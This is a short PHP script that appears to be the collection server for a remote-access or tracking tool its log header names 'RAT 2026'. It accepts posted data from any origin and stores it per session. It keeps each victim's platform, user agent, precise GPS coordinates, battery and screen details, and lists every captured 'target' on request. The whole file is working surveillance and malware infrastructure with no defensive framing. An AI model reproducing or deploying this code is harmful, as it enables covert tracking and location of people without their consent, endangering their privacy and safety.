<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// LIST TARGETS
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'list') {
    $targets = [];
    
    if (file_exists('data/rat_sessions.json')) {
        $data = json_decode(file_get_contents('data/rat_sessions.json'), true);
        if ($data && isset($data['sessions'])) {
            $targets = $data['sessions'];
        }
    }
    
    echo json_encode(['success' => true, 'targets' => $targets]);
    exit;
}

// RECEIVE DATA
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);
    
    if (!$data) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
        exit;
    }
    
    // Load existing sessions
    $sessions = ['sessions' => []];
    if (file_exists('data/rat_sessions.json')) {
        $sessions = json_decode(file_get_contents('data/rat_sessions.json'), true);
        if (!$sessions) $sessions = ['sessions' => []];
    }
    
    // Update or add session
    $found = false;
    foreach ($sessions['sessions'] as $key => $session) {
        if (isset($session['sessionId']) && $session['sessionId'] === $data['sessionId']) {
            $sessions['sessions'][$key] = $data;
            $found = true;
            break;
        }
    }
    
    if (!$found) {
        $sessions['sessions'][] = $data;
    }
    
    // Save sessions
    file_put_contents('data/rat_sessions.json', json_encode($sessions, JSON_PRETTY_PRINT));
    
    // Create text log
    $log = "\n" . str_repeat("=", 70) . "\n";
    $log .= "RAT 2026 Report - " . date('Y-m-d H:i:s') . "\n";
    $log .= str_repeat("=", 70) . "\n";
    $log .= "Session: " . ($data['sessionId'] ?? 'N/A') . "\n";
    $log .= "Platform: " . ($data['platform'] ?? 'N/A') . "\n";
    $log .= "User Agent: " . ($data['userAgent'] ?? 'N/A') . "\n";
    
    if (isset($data['location']) && !isset($data['location']['error'])) {
        $log .= "\nLOCATION:\n";
        $log .= "Lat: " . ($data['location']['latitude'] ?? 'N/A') . "\n";
        $log .= "Lon: " . ($data['location']['longitude'] ?? 'N/A') . "\n";
        $log .= "Accuracy: " . ($data['location']['accuracy'] ?? 'N/A') . " meters\n";
    }
    
    if (isset($data['battery'])) {
        $log .= "\nBATTERY:\n";
        $log .= "Level: " . ($data['battery']['level'] ?? 'N/A') . "\n";
        $log .= "Charging: " . (isset($data['battery']['charging']) && $data['battery']['charging'] ? 'Yes' : 'No') . "\n";
    }
    
    if (isset($data['screen'])) {
        $log .= "\nSCREEN:\n";
        $log .= "Resolution: " . ($data['screen']['width'] ?? 'N/A') . "x" . ($data['screen']['height'] ?? 'N/A') . "\n";
    }
    
    $log .= str_repeat("=", 70) . "\n";
    
    // Append to daily log
    $logfile = 'data/logs/rat_' . date('Y-m-d') . '.txt';
    file_put_contents($logfile, $log, FILE_APPEND);
    
    echo json_encode(['status' => 'success', 'message' => 'Data saved']);
    exit;
}

echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
?>